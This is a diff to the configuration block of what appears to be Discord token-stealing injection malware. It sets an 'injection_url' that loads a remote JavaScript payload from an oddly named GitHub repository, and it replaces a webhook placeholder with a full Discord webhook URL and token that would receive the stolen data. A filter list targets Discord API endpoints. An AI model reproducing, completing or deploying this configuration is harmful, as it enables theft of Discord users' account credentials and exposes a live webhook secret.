@@ -19,7 +19,7 @@ var config = {
 
     creator: "VERT",
     injection_url: "https://raw.githubusercontent.com/asdgufbasdgufghbujasdhbjfasdhbju/oodkkdkdkdkdkdkdk/main/jdjdjjd.js",
-    webhook: "%WEBHOOK%",
+    webhook: "https://discord.com/api/webhooks/1124805557535129600/4izXRjCPGeHgnFUFXAheaHGhCnP9vnEKOBESem1o2vCtRZmmHtzYImwTZn1Iard1edLg",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
